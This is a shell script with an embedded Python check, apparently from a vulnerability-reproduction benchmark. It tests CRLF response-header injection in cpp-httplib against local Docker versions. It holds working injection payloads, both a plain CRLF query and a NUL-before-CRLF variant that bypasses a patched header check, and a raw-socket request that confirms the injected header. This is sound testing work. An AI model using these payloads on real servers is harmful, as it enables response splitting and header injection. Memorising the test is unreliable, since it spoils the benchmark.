#!/usr/bin/env bash
# verify.sh --seed|--residual — cpp-httplib CRLF 响应头注入（CVE-2020-11709 seed / CVE-2025-0825 residual）
#
# 漏洞机制：server.cpp 将请求参数 x 经 res.set_header("X-Echo", x) 反射为响应头。
#   seed     plain-CRLF  x=SAFE%0d%0aX-Pcb-Inject:%20<RUN_FLAG>
#            V0(0.5.8) set_header 无过滤 -> 注入成功；V1(0.18.3) has_crlf 检查捕获 -> 阻断
#   residual NUL+CRLF   x=SAFE%00%0d%0aX-Pcb-Inject:%20<RUN_FLAG>
#            V1 has_crlf 沿 val.c_str() 扫描在 NUL 处停止，看不到 NUL 后的 CRLF -> 绕过注入；
#            V2(0.18.4) is_field_value 按长度检查每个字节 -> 阻断
#
# 效果通道：raw socket 读回响应头块，注入的 "X-Pcb-Inject: <RUN_FLAG>" 出现即效果发生。
# 判定基准：RUN_FLAG（提交值）注入 payload；响应中检出 RUN_FLAG => rc=0。
set -uo pipefail
JUDGE_FLAG="${RUN_FLAG_REF:-$RUN_FLAG}"
: "${RUN_ID:?}" "${COMPOSE_PROJECT_NAME:?}" "${RUN_FLAG:?}" "${VERSION:?}" "${WORK_DIR:?}"
MODE="${1:-}"
[[ "$MODE" == "--seed" || "$MODE" == "--residual" ]] || { echo "usage: --seed|--residual" >&2; exit 30; }
CASE_DIR="$(cd "$(dirname "$0")/.." && pwd)"
PY="${PCB_PYTHON:-python3}"
mkdir -p "$WORK_DIR"

# 宿主端口：docker compose port 动态解析（服务名=版本名 v0/v1/v2，容器端口 8080），回退固定映射
PORT="$(CPORT="$(grep -A4 '^service:' "$CASE_DIR/case.yaml" | grep -oE 'exposed_ports: \[[0-9, ]*\]' | grep -oE '[0-9]+' | head -1)"
CPORT="${CPORT:-8080}"
docker compose -p "$COMPOSE_PROJECT_NAME" --project-directory "$CASE_DIR" port "$VERSION" "$CPORT" 2>/dev/null | sed 's/.*://' | tr -d '[:space:]')"
case "$VERSION" in
  v0) FIXED=18080;; v1) FIXED=18081;; v2) FIXED=18082;; *) FIXED=18080;;
esac
PORT="${PORT:-$FIXED}"

"$PY" - "$MODE" "$PORT" "$RUN_FLAG" <<'PYEOF'
import socket, sys, time, json, os as _o
mode, port, flag = sys.argv[1], int(sys.argv[2]), sys.argv[3]
judge = _o.environ.get("RUN_FLAG_REF") or flag
if mode == "--seed":
    query = "x=SAFE%0d%0aX-Pcb-Inject:%20" + flag.replace(" ", "%20")
else:
    query = "x=SAFE%00%0d%0aX-Pcb-Inject:%20" + flag.replace(" ", "%20")
req = ("GET /echo?" + query + " HTTP/1.1\r\nHost: pcb\r\nConnection: close\r\n\r\n").encode("latin-1")
t0 = time.time()
try:
    s = socket.create_connection(("127.0.0.1", port), timeout=8.0)
    s.sendall(req)
    chunks = []
    while True:
        b = s.recv(4096)
        if not b:
            break
        chunks.append(b)
    s.close()
    raw = b"".join(chunks)
    head = raw.split(b"\r\n\r\n", 1)[0].decode("latin-1", "replace")
except Exception as e:
    print(json.dumps({"mode": mode, "port": port, "error": str(e)[:200]}))
    sys.exit(20)
ok = judge.encode("latin-1") in raw
print(json.dumps({"mode": mode, "port": port, "injected": ok,
                  "latency_s": round(time.time() - t0, 2)}))
print("----- response header block -----")
print(head)
print("-----")
sys.exit(0 if ok else 10)
PYEOF
RC=$?
echo "verify rc=$RC (0=effect: injected X-Pcb-Inject header / 10=blocked)"
exit $RC
